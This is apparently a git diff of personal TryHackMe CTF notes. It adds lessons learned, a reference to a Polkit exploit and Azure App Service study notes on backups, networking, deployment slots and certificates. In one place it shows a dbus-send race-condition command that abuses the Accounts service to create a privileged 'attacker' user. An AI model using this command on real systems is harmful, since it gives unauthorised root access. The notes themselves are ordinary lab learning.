@@ -11,6 +11,8 @@ Goals:
 Learnt:
 - `PATTERN$` I always got that wrong I updated my notes as I was incorrectly `$PATTERN`
 - I overthought `sed 's/customer-id-.\.txt://g'` a bit but figure it out without searching
+- SAST automation tools Semgrep and Psalm exist
+- Polkit exploit  
 Beyond Root:
 - Azure Application Services and App Service Plan 
 - Hack the website and back door it myself and patch my in.
@@ -267,7 +269,7 @@ Exploitation Steps:
 # Time the creation of a new user 
 time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
 # Race condition to kill command half way through execution to create new user and add to sudo group
-dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.004s; kill $!
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.003s; kill $! && id attacker
 # Check user has been created
 id attacker
 # Password hash creation for the hash used below 
@@ -320,33 +322,54 @@ wget -r http://10.10.233.101/
 
 #### Source Code Analysis
 
-
+[Finish the THM Static Application Testing Room...](https://tryhackme.com/room/sast)
+- Give I could not escalate privileges I decided to focus improving my tooling and notes as I could not get the full app and do a comparison
 
 #### Azure Application Services and App Service Plan  
 
 I am going for Azure exams soon so adding this here to justify doing the CTF even more...
 
 - Create and configure Azure App Service
-- 
 	- Provision an App Service plan
 		- Requires a Resource group
-		
 	- Configure scaling for an App Service plan
-		- 
+		- add Autoscale for simplicity 
 	- Create an App Service
 		- Export the App Plan as an Azure Resource Manager (ARM) template
-	- Configure certificates and TLS for an App Service
-		- 
+		- Manual or Automated
+	- Configure certificates and TLS for an App Service reate a free App Service managed certificate
 	- Map an existing custom DNS name to an App Service
-		- 
+		- `Search -> App Services -> Custom Domains`
 	- Configure backup for an App Service
-		- 
+		- Standard or Premium tier App Service plan 
+		- Full backup is default; partial backups are supported; 10 GB in size
+			- Each consists of
+				- Zip file containing back-up data
+				- The XML manifest file of the zipped content
+		- Storage Container
+		Provide the in `App Services -> $App -> Backup `
+		- Check firewall on storage account!
 	- Configure networking settings for an App Service
-		- 
+		- Some Apps require multiple Subnets per service, per context!!:
+			- Web = DB, Front End, Processing - one for each layer!
+		- Public access and network injection toggles
+		- Private Link and Endpoints
+		- Networking features are not available for [apps deployed in Azure Arc](https://learn.microsoft.com/en-us/azure/app-service/overview-arc-integration)
 	- Configure deployment slots for an App Service
-		- 
+		- `App Services -> $App -> Deployment Slots -> + Add Slot`
+			- Configure Autoswap
+		- Swap between slots 
+			- `Search -> App Services -> $App -> Deployment Slots -> Swap`
 
+![1080](traverse-thm-azure-example.excalidraw)
 
+For TLS  I would create a Create a free App Service managed certificate for the custom domain.
 
-
+|   |   |
+|---|---|
+|Create a free App Service managed certificate|A private certificate that's free of charge and easy to use if you just need to secure your [custom domain](https://learn.microsoft.com/en-us/azure/app-service/app-service-web-tutorial-custom-domain) in App Service.|
+|Import an App Service certificate|A private certificate that's managed by Azure. It combines the simplicity of automated certificate management and the flexibility of renewal and export options.|
+|Import a certificate from Key Vault|Useful if you use [Azure Key Vault](https://learn.microsoft.com/en-us/azure/key-vault/) to manage your [PKCS12 certificates](https://wikipedia.org/wiki/PKCS_12). See [Private certificate requirements](https://learn.microsoft.com/en-us/azure/app-service/configure-ssl-certificate?tabs=apex#private-certificate-requirements).|
+|Upload a private certificate|If you already have a private certificate from a third-party provider, you can upload it. See [Private certificate requirements](https://learn.microsoft.com/en-us/azure/app-service/configure-ssl-certificate?tabs=apex#private-certificate-requirements).|
+|Upload a public certificate|Public certificates aren't used to secure custom domains, but you can load them into your code if you need them to access remote resources.|
 
